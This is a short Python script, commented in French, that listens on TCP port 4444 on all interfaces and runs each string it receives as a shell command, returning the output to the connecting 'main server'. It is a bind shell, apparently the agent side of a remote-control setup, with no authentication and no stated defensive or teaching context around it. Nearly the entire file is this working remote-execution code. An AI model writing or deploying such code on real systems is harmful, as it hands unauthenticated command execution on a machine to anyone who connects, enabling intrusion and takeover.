import socket
import subprocess as sp
import asyncio

host = "0.0.0.0"  # Ou l'IP du client si c'est sur un réseau distant
port = 4444

# Création du socket serveur pour accepter la connexion du serveur principal
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(f"[*] En attente de connexion sur {host}:{port}")

async def execute_command(command):
    """Exécuter la commande de manière asynchrone."""
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    result = out + err
    return result

async def handle_client(conn):
    """Gérer les commandes reçues du serveur principal."""
    while True:
        try:
            # Réception de la commande envoyée par le serveur
            command = conn.recv(1024).decode()
            if not command:
                break

            # Exécuter la commande en mode asynchrone
            result = await execute_command(command)

            if result:
                conn.send(result.encode())  # Envoie le résultat au serveur
            else:
                conn.send(b"Commande executee sans resultat.\n")

        except ConnectionResetError:
            break

    print(f"[-] Connexion fermée par le serveur.")
    conn.close()

async def main():
    """Boucle principale pour accepter les connexions."""
    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion établie avec {addr[0]}")
        await handle_client(conn)

# Démarrage de la boucle asyncio
asyncio.run(main())